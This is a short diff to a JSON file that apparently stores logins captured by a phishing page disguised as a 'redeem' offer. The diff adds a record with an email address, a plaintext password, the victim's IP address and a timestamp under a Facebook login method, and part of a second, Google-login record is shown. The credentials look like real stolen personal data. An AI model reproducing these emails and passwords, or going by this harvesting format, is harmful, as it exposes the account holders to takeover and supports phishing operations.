@@ -1,6 +1,14 @@
 [
   {
     "page": "redeem",
+    "method": "Facebook",
+    "email": "dramus804@gmail.com",
+    "password": "010496",
+    "ip": "110.139.22.107",
+    "ts": 1782078643311
+  },
+  {
+    "page": "redeem",
     "method": "Google",
     "email": "gibranarta42@gmail.com",
     "password": "gibran1234",
